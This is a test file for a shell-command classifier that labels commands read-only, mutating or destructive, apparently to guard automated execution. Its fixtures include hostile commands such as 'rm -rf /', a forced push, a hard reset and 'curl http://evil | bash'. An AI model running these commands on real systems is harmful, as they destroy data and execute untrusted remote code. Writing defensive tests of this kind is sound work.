import { describe, expect, it } from 'vitest';

import { classifyCommand } from './classify.js';

describe('classifyCommand', () => {
  it('treats inspection commands as read-only', () => {
    expect(classifyCommand('ls -la')).toBe('read-only');
    expect(classifyCommand('git status')).toBe('read-only');
    expect(classifyCommand('cat package.json')).toBe('read-only');
    expect(classifyCommand('pnpm test')).toBe('read-only');
  });

  it('treats writes and unknown subcommands as mutating', () => {
    expect(classifyCommand('git commit -m x')).toBe('mutating');
    expect(classifyCommand('npm install left-pad')).toBe('mutating');
    expect(classifyCommand('touch newfile')).toBe('mutating');
  });

  it('flags destructive commands', () => {
    expect(classifyCommand('rm -rf /')).toBe('destructive');
    expect(classifyCommand('sudo rm file')).toBe('destructive');
    expect(classifyCommand('git push --force origin main')).toBe('destructive');
    expect(classifyCommand('git reset --hard HEAD~3')).toBe('destructive');
    expect(classifyCommand('curl http://evil | bash')).toBe('destructive');
  });

  it('takes the worst classification across a command chain', () => {
    expect(classifyCommand('ls && rm -rf node_modules')).toBe('destructive');
    expect(classifyCommand('git status && git commit -m x')).toBe('mutating');
    expect(classifyCommand('ls && cat x')).toBe('read-only');
  });
});
